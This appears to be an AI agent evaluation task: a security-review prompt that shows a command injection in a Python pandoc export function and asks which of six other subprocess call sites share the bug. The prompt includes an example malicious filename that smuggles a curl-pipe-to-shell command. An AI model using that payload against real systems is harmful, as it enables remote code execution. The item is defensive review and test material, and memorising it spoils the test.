---
max_turns: 20
timeout_seconds: 480
allowed_tools: [Skill, Read, Grep, Glob]
runs: 3
---
We found a command injection in the export pipeline:

```python
# export/render.py:47
def render_export(doc_path, fmt):
    subprocess.run(
        f"pandoc {doc_path} -o out.{fmt}",
        shell=True,
        check=True,
    )
```

`doc_path` is a client-supplied upload path, so a filename like `x.md; curl attacker.sh |
sh` executes.

Here is every other site in the pipeline that builds or runs an external command. Which of
these are the same bug? Verdict on each, with a severity.

```python
# export/convert.py:19
def stdin_convert(body, job_id):
    out = os.path.join(SPOOL_DIR, f"{job_id}.html")
    subprocess.run(
        ["pandoc", "-f", "markdown", "-t", "html", "-o", out],
        input=body.encode(),
        check=True,
    )
    return out
```
`body` is the client's document text. `job_id` is a server-generated UUID.

```python
# export/probe.py:28
def quoted_probe(src):
    return subprocess.run(
        f"ffprobe -v quiet {shlex.quote(src)}",
        shell=True,
        capture_output=True,
    ).stdout
```
`src` is client-supplied.

```python
# export/maintenance.py:11
CLEANUP = "find /var/spool/export -mtime +7 -delete"

def const_cmd():
    subprocess.run(CLEANUP, shell=True, check=True)
```

```python
# export/encode.py:34
ALLOWED_FORMATS = {"mp4", "webm", "gif"}

def enum_validated(src_path, fmt):
    if fmt not in ALLOWED_FORMATS:
        raise ValueError(f"unsupported format: {fmt}")
    return subprocess.run(
        ["ffmpeg", "-i", src_path, "-f", fmt, "out." + fmt],
        check=True,
    )
```
Both parameters are client-supplied.

```python
# export/ui.py:73
def no_exec(doc_path, fmt):
    """Render the equivalent CLI invocation for the 'copy as command' button."""
    return f"pandoc {shlex.quote(doc_path)} -o out.{fmt}"
```
The return value is displayed in the UI as text. Nothing in the codebase passes it to a
shell, a subprocess, or `eval`.
